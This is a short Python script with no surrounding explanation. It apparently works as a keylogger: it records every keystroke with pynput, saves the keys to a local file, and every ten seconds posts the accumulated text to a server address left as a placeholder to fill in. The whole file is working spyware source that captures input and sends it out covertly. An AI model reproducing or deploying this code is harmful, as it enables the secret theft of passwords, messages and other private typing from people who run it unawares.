from pynput.keyboard import Listener
import random
import time
import threading
import requests
p=open(f'infoo', 'w')
default=int(time.time())+300
finish=False
allData=""
def onClick(key):
  global p
  global default
  global finish
  global allData
  r=str(key).replace("'","").replace("Key.space"," ").replace("Key.shift_r?"," ").replace("Key.backspace","").replace("<65027>2","@").replace("<65027>","@")
  p.write(str(r).replace("'",""))
  allData+=str(r).replace("'","")
  if(int(time.time()) > default):
    finish=True
    p.close()
    quit()
    
    
def clickListener():    
  with Listener(on_press=onClick) as u:
    u.join()

def backup():
  global p
  global finish
  c=1
  while (finish==False):
    time.sleep(10)
    p.close()
    p=open(f'infoo', 'a')
    if(c>=1):
      c=0
      print("goServerr")
      sendInfoToServer();
    c+=1  
      

def sendInfoToServer():
  global p
  global allData
  params = {'data':allData}
  response = requests.post('YOUR WEBSITE', data = params)
  print(response.content)

capturatorThread = threading.Thread(target=backup)
backupThread = threading.Thread(target=clickListener)
capturatorThread.start()
backupThread.start()
 
